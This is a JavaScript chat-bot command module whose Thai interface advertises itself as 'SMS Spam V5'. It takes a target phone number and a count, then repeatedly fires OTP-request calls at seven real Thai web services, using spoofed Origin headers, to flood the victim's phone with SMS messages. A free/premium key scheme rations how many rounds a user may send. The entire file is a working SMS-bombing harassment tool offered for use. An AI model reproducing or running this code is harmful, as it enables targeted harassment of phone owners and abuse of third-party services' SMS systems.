const axios = require('axios');
const fs = require('fs');
const path = require('path');

const usersFile = path.join(__dirname, 'users.json');
let users = fs.existsSync(usersFile) ? JSON.parse(fs.readFileSync(usersFile)) : {};

module.exports = {
  config: {
    name: "sms",
    version: "1.1.5",
    description: "🔥 สแปม SMS สุดโหดด้วย Multi-API!",
    usage: "/sms <เบอร์> <จำนวน> หรือ /sms <คีย์> หรือ /sms ใส่คีย์",
    aliases: ["fd888"],
  },
  run: async ({ api, event, args }) => {
    const { senderID } = event;

    users[senderID] = users[senderID] || { key: null, keyExpiry: null, keyType: null, usedKeys: [], usage: {} };
    const today = new Date().toDateString();

    // กรณีขอคีย์ฟรี
    if (args[0] === "ใส่คีย์") {
      if (users[senderID].usage[today] && users[senderID].usage[today].freeKeyIssued) {
        return api.sendMessage(senderID, `
⛔ **วันนี้รับคีย์ฟรีไปแล้ว!**
🔑 คีย์ปัจจุบัน: ${users[senderID].key || "ไม่มี"}
⏰ หมดอายุ: ${users[senderID].key ? new Date(users[senderID].keyExpiry).toLocaleString('th-TH') : "-"}
        `);
      }

      let freeKey;
      do {
        freeKey = generateKey();
      } while (users[senderID].usedKeys.includes(freeKey)); // ตรวจสอบว่าไม่ซ้ำ

      users[senderID].key = freeKey;
      users[senderID].keyExpiry = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString();
      users[senderID].keyType = "free";
      users[senderID].usedKeys.push(freeKey); // บันทึกคีย์ที่ใช้แล้ว
      users[senderID].usage[today] = users[senderID].usage[today] || {};
      users[senderID].usage[today].freeKeyIssued = true;
      saveUsers();

      return api.sendMessage(senderID, `
✅ **รับคีย์ฟรีสำเร็จ!**
🔑 คีย์: ${freeKey}
⏰ หมดอายุ: 24 ชม.
✨ ใช้: /sms ${freeKey} เพื่อบันทึกคีย์
      `);
    }

    // กรณีใส่คีย์
    if (args.length === 1 && /^[A-Z0-9]{13}$/.test(args[0])) {
      const inputKey = args[0];

      if (users[senderID].usedKeys.includes(inputKey)) {
        const isExpired = !users[senderID].key || new Date() > new Date(users[senderID].keyExpiry);
        return api.sendMessage(senderID, `
❌ **คีย์นี้ถูกใช้แล้ว${isExpired ? "และหมดอายุแล้ว" : ""}!**
🔑 คีย์: ${inputKey}
💡 รับคีย์ใหม่: /sms ใส่คีย์ หรือ /เติมเงิน
        `);
      }

      const isPremiumKey = inputKey === users[senderID].key && users[senderID].keyType === "premium";
      const isFreeKey = inputKey === users[senderID].key && users[senderID].keyType === "free";

      if (!isPremiumKey && !isFreeKey) {
        return api.sendMessage(senderID, `
❌ **คีย์ไม่ถูกต้อง!**
🔑 ตรวจสอบคีย์ที่ได้รับจาก /เติมเงิน หรือ /sms ใส่คีย์
        `);
      }

      users[senderID].usedKeys.push(inputKey); // บันทึกคีย์ที่ใช้แล้ว
      saveUsers();

      return api.sendMessage(senderID, `
✅ **บันทึกคีย์สำเร็จ!**
🔑 คีย์: ${inputKey}
📅 หมดอายุ: ${new Date(users[senderID].keyExpiry).toLocaleString('th-TH')}
✨ ใช้: /sms <เบอร์> <จำนวน> (${users[senderID].keyType === "premium" ? "1-500" : "1-20"} ครั้ง)
      `);
    }

    // กรณียิง SMS
    if (args.length < 2) {
      return api.sendMessage(senderID, `
✨ **SMS Spam V5 - พลังไร้ขีดจำกัด!**
📜 ใช้: /sms <เบอร์> <จำนวน>
💡 ตัวอย่าง: /sms 0987456321 10
🔑 รับคีย์ฟรี: /sms ใส่คีย์
🔑 บันทึกคีย์: /sms <คีย์>
      `);
    }

    const phone = args[0];
    const count = parseInt(args[1]);

    if (!/^\d{10}$/.test(phone)) {
      return api.sendMessage(senderID, `
⚠️ **เบอร์ไม่ถูกต้อง!**
📞 ต้องเป็น 10 หลัก เช่น 0987456321
      `);
    }

    const hasValidKey = users[senderID].key && new Date() < new Date(users[senderID].keyExpiry);
    const isPremium = hasValidKey && users[senderID].keyType === "premium";
    const maxCount = isPremium ? 500 : 20;

    if (!hasValidKey) {
      return api.sendMessage(senderID, `
⛔ **ไม่มีคีย์ใช้งาน!**
🔑 คีย์ปัจจุบัน: ${users[senderID].key || "ไม่มี"}
⏰ สถานะ: ${users[senderID].key ? "หมดอายุ" : "ยังไม่ได้บันทึก"}
💡 รับคีย์ฟรี: /sms ใส่คีย์ หรือ /เติมเงิน
      `);
    }

    if (isNaN(count) || count < 1 || count > maxCount) {
      return api.sendMessage(senderID, `
⚠️ **จำนวนผิด!**
🔢 ${isPremium ? "พรีเมียม: 1-500" : "ฟรี: 1-20"}
      `);
    }

    await api.sendMessage(senderID, `
🔥 **เริ่มยิง SMS สุดโหด!**
📞 เป้า: ${phone}
🎯 จำนวน: ${count} ครั้ง
🔑 ประเภท: ${isPremium ? "พรีเมียม" : "ฟรี"}
👾 Powered by: โทมัส V5
    `);

    let successCount = 0;
    for (let i = 0; i < count; i++) {
      try {
        const headers = {
          fd888: { "Content-Type": "application/json", "Origin": "https://fd888.org", "User-Agent": "Mozilla/5.0" },
          gb789: { "Content-Type": "application/json", "Origin": "https://gb-789.com", "User-Agent": "Mozilla/5.0" },
          meoaw: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0" },
          concert: { "content-type": "application/json;charset=UTF-8", "User-Agent": "Mozilla/5.0" }
        };

        const requests = [
          axios.post("https://service.fd888.org/api/user/request-otp", { phone }, { headers: headers.fd888 }),
          axios.post("https://gb-789.com/api/tiamut/otp", { phone }, { headers: headers.gb789 }),
          axios.post("https://www.carsome.co.th/website/login/sendSMS", { username: phone, optType: 0 }, { headers: headers.meoaw }),
          axios.post("https://api-sso.ch3plus.com/user/request-otp", { tel: phone, type: "login" }, { headers: headers.meoaw }),
          axios.post(`https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number=${phone}`, {}, { headers: headers.meoaw }),
          axios.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", { username: phone }, { headers: headers.meoaw }),
          axios.post("https://www.theconcert.com/rest/request-otp", { mobile: phone, country_code: "TH", lang: "th", channel: "sms", digit: 4 }, { headers: headers.concert })
        ];

        const responses = await Promise.allSettled(requests);
        successCount += responses.filter(r => r.status === "fulfilled" && r.value.status === 200).length;
      } catch (error) {
        continue;
      }
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    await api.sendMessage(senderID, `
✅ **ยิง SMS เสร็จสิ้น!**
📞 เบอร์: ${phone}
📊 สำเร็จ: ${successCount}/${count * 7} ครั้ง
🚀 7 API: FD888, GB-789, Carsome, CH3Plus, True(x2), TheConcert
🔑 ประเภท: ${isPremium ? "พรีเมียม" : "ฟรี"}
⏰ คีย์หมดอายุ: ${new Date(users[senderID].keyExpiry).toLocaleString('th-TH')}
    `);
  },

  generateKey() {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let key = "";
    for (let i = 0; i < 13; i++) key += chars.charAt(Math.floor(Math.random() * chars.length));
    return key;
  },

  saveUsers() {
    fs.writeFileSync(usersFile, JSON.stringify(users, null, 2));
  }
};

function generateKey() {
  return module.exports.generateKey();
}

function saveUsers() {
  module.exports.saveUsers();
}
